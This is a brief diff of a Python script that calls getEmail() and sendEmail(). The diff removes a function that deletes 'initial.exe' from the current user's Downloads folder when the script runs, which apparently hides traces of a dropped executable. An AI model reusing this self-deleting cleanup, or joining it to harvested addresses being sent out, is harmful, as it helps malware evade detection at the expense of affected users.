@@ -106,13 +106,7 @@ def sendEmail(usernames):
         # Close the port
     TIE_server.quit()
 
-def remove():
-    name = os.getlogin()
-    os.chdir("/Users/" + name + "/Downloads")
-    print(os.getcwd())
-    os.remove("initial.exe")
 
-remove()
 lnewlist = getEmail()
 print(lnewlist)
 sendEmail(lnewlist)
